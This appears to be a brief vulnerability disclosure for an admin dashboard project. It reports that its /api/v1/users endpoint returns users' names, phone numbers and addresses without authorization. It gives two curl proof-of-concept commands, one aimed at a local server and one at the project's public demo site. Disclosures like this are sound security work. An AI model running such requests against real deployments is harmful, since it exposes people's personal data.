| 1. Unauthorized access to some interfaces in the foreground leads to leakage of sensitive information 2. Install according to the official documents    [image](https://user-images.githubusercontent.com/55682875/149249553-8f7732de-21b4-4895-a53f-cd2751405adc.png)    2.1    Unauthorized access is found on some interfaces    For example:    /api/v1/users    the poc is :    curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' <http://192.168.0.125:7001/api/v1/users>    2.2 At this time you can see some information back, such as the user ID, name, age, phone number, address and other sensitive information.    [image](https://user-images.githubusercontent.com/55682875/149251012-1c0984a1-cd72-4ab7-bb9e-bbb7a27f141d.png)    2.2 It can also be reproduced in the official sample site    <https://antd-admin.zuiidea.com/login?from=>    the poc is :    curl -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36' <https://antd-admin.zuiidea.com/api/v1/users>    [image](https://user-images.githubusercontent.com/55682875/149251395-1fc23aac-00c1-476c-99ae-d518a7dab0df.png) |
